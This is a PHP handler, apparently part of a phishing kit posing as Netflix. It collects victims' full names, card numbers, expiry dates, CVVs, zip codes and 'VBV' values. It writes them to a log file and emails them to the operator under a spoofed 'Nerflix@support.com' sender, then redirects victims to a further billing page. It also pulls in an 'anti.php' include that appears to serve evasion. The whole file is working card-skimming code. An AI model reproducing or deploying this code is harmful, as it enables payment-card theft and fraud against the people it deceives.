<?php

session_start();
include '../anti.php';
include '../vg.php';
include '../truelogin.php';


$fn = $_SESSION['firstName'] = $_POST['firstName'];
$ln = $_SESSION['lastName'] = $_POST['lastName'];
$num = $_SESSION['creditCardNumber'] = $_POST['creditCardNumber'];
$expm = $_SESSION['expMonth'] = $_POST['expMonth'];
$expy = $_SESSION['expYear']= $_POST['expYear'];
$cvv = $_SESSION['creditCardSecurityCode'] = $_POST['creditCardSecurityCode'];
$zip = $_SESSION['creditZipcode'] = $_POST['creditZipcode'];
$vbv = $_SESSION['vbv'] = $_POST['vbv'];
$iP_adress = $_SERVER['REMOTE_ADDR'];


$vg = "
|==================Card Info====================|
|Full Name       : $fn $ln
|Card num        : $num
|Exp date          : $expm / $expy
|CVV   : $cvv
|Zip Code         : $zip
|VBV : $vbv
|IP Adresse       : https://geoiptool.com/?ip=$iP_adress
|===============================================|";


$txt = fopen('../../r/r.txt', 'a');
fwrite($txt, $vg);
fclose($txt);

$subject = "Cvv [$iP_adress]";
$headers = 'From: Nerflix@support.com' . "\r\n" .
        'X-Mailer: PHP/' . phpversion();
mail($to, $subject, $vg, $headers);
mail($tox, $subject, $vg, $headers);

header("location:../bill?websrc=".md5('AbdowVG')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");




?>